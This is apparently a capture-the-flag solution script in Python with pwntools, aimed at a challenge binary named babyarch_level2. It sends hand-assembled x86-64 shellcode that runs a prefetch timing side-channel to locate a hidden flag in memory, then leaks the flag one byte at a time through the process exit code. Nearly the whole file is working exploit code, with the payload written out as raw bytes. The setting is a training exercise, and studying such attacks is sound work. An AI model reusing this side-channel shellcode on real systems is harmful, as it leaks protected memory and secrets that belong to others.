# prefetch attack to find out the flag location. Write the attack in c and compile it to asm with gcc -c -S -> turning the assembly file to shellcode by `as` then `ld --oformat=binary `
from pwn import *
import time

context.arch = 'amd64'

#p = gdb.debug("/challenge/babyarch_level2", gdbscript="continue")

def get_timing(line):
    return int(line.split('in ')[1].split(' cycles')[0])


# read the pre-compiled shellcode
'''
f = open("./prefetch.shell", "rb")
payload_raw = f.read()
f.close()
'''

flag = ""

for i in range(40):
    exit_code = -1
    while exit_code < 0:
        payload = b'AUATI\xbc\x00\x00\x00\x00\x00\x01\x00\x00U\xbd\xe8\x03\x00\x00SH\xbb\x00\x00\x00\x00\x10\x00\x00\x00H\x83\xec\x08H\x89\xdf\xe8 \x00\x00\x009\xe8s\x05I\x89\xdd\x89\xc5H\x81\xc3\x00\x00\x01\x00L9\xe3u\xe3A\x8b}' + bytes([i]) + b'\xb8<\x00\x00\x00\x0f\x05ATE1\xe4S\xbb\n\x00\x00\x00\x0f1\x0f\xae\xe8H\x89\xc1H\xc1\xe2 \x0f\x18\x1f\x0f\xae\xe8H\t\xd1\x0f1)\xc8A\x01\xc4\x83\xeb\x01u\xdfD\x89\xe0[A\\\xc3f\x90'
        p = process("/challenge/babyarch_level2")
        p.send(payload)
        p.recvall()
        exit_code = p.poll()

    print(f'exit_code = {exit_code}')
    p.close()
    if (exit_code > 0):
        flag += chr(exit_code)
    else:
        break

print(flag)
